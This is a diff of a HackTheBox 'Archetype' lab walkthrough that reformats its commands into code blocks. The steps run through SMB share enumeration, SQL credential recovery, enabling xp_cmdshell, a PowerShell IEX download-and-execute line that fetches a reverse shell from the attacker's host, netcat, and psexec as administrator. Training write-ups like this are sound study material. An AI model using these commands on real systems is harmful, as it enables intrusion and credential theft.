@@ -5,61 +5,65 @@ This is the first box of the ‘Starting Point’ path from HackTheBox (a series
 
 **Tools: nmap, smbclient, netcat, Impacket (mssqlclient.py and psexec.py).**
 
-We begin with a scan using nmap (this machine’s IP is 10.10.10.27):
-> nmap -n -sC -sV -Pn -T4 10.10.10.27
+We begin with a scan using nmap (this machine’s IP is 10.10.10.27):  
+`nmap -n -sC -sV -Pn -T4 10.10.10.27`
 
-Or for a more complete scan:
-> nmap -n -sC -sV -p- -Pn 10.10.10.27
+Or for a more complete scan:  
+`nmap -n -sC -sV -p- -Pn 10.10.10.27`
 
 ![Archetype](../Images/htb_archetype_2.png)
 
 The result shows a few open ports, the most promising being 445 (smb) and 1433 (sql server).  
-Next up, we try to enumerate the smb with smbclient to look for shared folders:
-> smbclient -L \\10.10.10.27 -N
+Next up, we try to enumerate the smb with smbclient to look for shared folders:  
+`smbclient -L \\10.10.10.27 -N`
 
 ![Archetype](../Images/htb_archetype_3.png)
 
-There is a ‘backups’ share, and upon accessing it, we see a file called ‘prod.dtsConfig’, then we simply download it:
-> smbclient -N //10.10.10.27/backups  
-> dir  
->  get prod.dtsConfig  
+There is a ‘backups’ share, and upon accessing it, we see a file called ‘prod.dtsConfig’, then we simply download it:  
+```
+smbclient -N //10.10.10.27/backups  
+dir  
+get prod.dtsConfig  
+```
 
 ![Archetype](../Images/htb_archetype_4.png)
 
-Now we can read the file:
-> cat prod.dtsConfig
+Now we can read the file:  
+`cat prod.dtsConfig`
 
 ![Archetype](../Images/htb_archetype_5.png)
 
 This is a config file from the SQL Server, and we can see that there is a Password and an User field. We can use this to connect to the SQL Server, and for this we’ll be using the mssqlclient.py script from the Impacket toolkit. Now this is the part where I ran into some issues with this script, so I had to do the following procedure to get it to work.  
 
-Install pip for python3:
-> sudo apt install python3-venv python3-pip
+Install pip for python3:  
+`sudo apt install python3-venv python3-pip`
 
-Git clone impacket, better do it to at /opt to keep it organized:
-> sudo git clone https://github.com/SecureAuthCorp/impacket.git
+Git clone impacket, better do it to at /opt to keep it organized:  
+`sudo git clone https://github.com/SecureAuthCorp/impacket.git`
 
-Go inside the impacket folder (cd impacket) and run:
-> pip3 install .
+Go inside the impacket folder (cd impacket) and run:  
+`pip3 install .`
 
-Next, we go to the ‘examples’ folder, where the script is, and run the following command to log into the SQL Server:
-> python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+Next, we go to the ‘examples’ folder, where the script is, and run the following command to log into the SQL Server:  
+`python3 mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth`
 
 We insert the password found previously and we’re in.  
-Next up, we run a query to find out if we have the highest privileges:
-> SELECT IS_SRVROLEMEMBER (‘sysadmin’)
+Next up, we run a query to find out if we have the highest privileges:  
+`SELECT IS_SRVROLEMEMBER (‘sysadmin’)`
 
 The answer should be 1 (= true), confirming that we have sysadmin privileges.
 
 ![Archetype](../Images/htb_archetype_6.png)
 
-Now we can enable the xp_cmdshell (“Spawns a Windows command shell and passes in a string for execution”) to gain Remote Command Execution (RCE):
-> EXEC sp_configure ‘Show Advanced Options’, 1;  
-> reconfigure;  
-> sp_configure;  
-> EXEC sp_configure ‘xp_cmdshell’, 1  
-> reconfigure;  
-> xp_cmdshell “whoami” (run commands to test, like ‘whoami’ or ‘hostname’)  
+Now we can enable the xp_cmdshell (“Spawns a Windows command shell and passes in a string for execution”) to gain Remote Command Execution (RCE):  
+```
+EXEC sp_configure ‘Show Advanced Options’, 1;  
+reconfigure;  
+sp_configure;  
+EXEC sp_configure ‘xp_cmdshell’, 1  
+reconfigure;  
+xp_cmdshell “whoami” (run commands to test, like ‘whoami’ or ‘hostname’)  
+```
 
 ![Archetype](../Images/htb_archetype_7.png)
 
@@ -68,19 +72,19 @@ In order to get a ‘real’ shell, we can try a reverse shell. Below, is the po
 ![Archetype](../Images/htb_archetype_code.png)
 
 We save it to a *‘revshell.ps1’* file in our VM.  
-Then we set up a python http server to host the revshell file:
-> python -m SimpleHTTPServer 80  
-> or  
->  python3 -m http.server 80
+Then we set up a python http server to host the revshell file:  
+`python -m SimpleHTTPServer 80`  
+or  
+`python3 -m http.server 80`  
 
-Now we can start a netcat listening session on port 443:
-> nc -vnlp 443
+Now we can start a netcat listening session on port 443:  
+`nc -vnlp 443`
 
-~ If you have your ufw firewall enabled in your VM, you’ll need to change the rules to allow incoming requests to ports 80 and 443:
-> ufw allow from 10.10.10.27 proto tcp to any port 80,443
+~ If you have your ufw firewall enabled in your VM, you’ll need to change the rules to allow incoming requests to ports 80 and 443:  
+`ufw allow from 10.10.10.27 proto tcp to any port 80,443`
 
-Now in our target machine’s SQL Server, we can run the command to download our revshell file (**one-liner command**):
-> xp_cmdshell “powershell “IEX (New-Object Net.WebClient).DownloadString(\”http://10.10.15.29/revshell.ps1");”
+Now in our target machine’s SQL Server, we can run the command to download our revshell file (**one-liner command**):  
+`xp_cmdshell “powershell “IEX (New-Object Net.WebClient).DownloadString(\”http://10.10.15.29/revshell.ps1");”`
 
 And back to our netcat…
 
@@ -91,15 +95,15 @@ The user.txt file containing the user flag is at the sql_svc user’s desktop, s
 
 ![Archetype](../Images/htb_archetype_9.png)
 
-In order to get the root flag, we’ll need to, well, become root (in this ‘Windows case’, Administrator a.k.a ‘nt authority\system’). As this sql_svc account is a service account, it’s good practice to check for recently accessed files / executed commands. To do so in PowerShelll, we can insert the command below in our reverse shell (**one-liner command**):
-> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+In order to get the root flag, we’ll need to, well, become root (in this ‘Windows case’, Administrator a.k.a ‘nt authority\system’). As this sql_svc account is a service account, it’s good practice to check for recently accessed files / executed commands. To do so in PowerShelll, we can insert the command below in our reverse shell (**one-liner command**):  
+`type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
 ![Archetype](../Images/htb_archetype_10.png)
 
 And there it is! “Someone” mapped the *‘backups’* share using the administrator credentials.  
 
-Next step is to use another Impacket script, psexec.py (we do so in our VM’s terminal, so we go back to the /opt/impacket/examples folder):
-> python3 psexec.py administrator@10.10.10.27
+Next step is to use another Impacket script, psexec.py (we do so in our VM’s terminal, so we go back to the /opt/impacket/examples folder):  
+`python3 psexec.py administrator@10.10.10.27`
 
 We simply provide the password when asked, and do a quick whoami check:
 
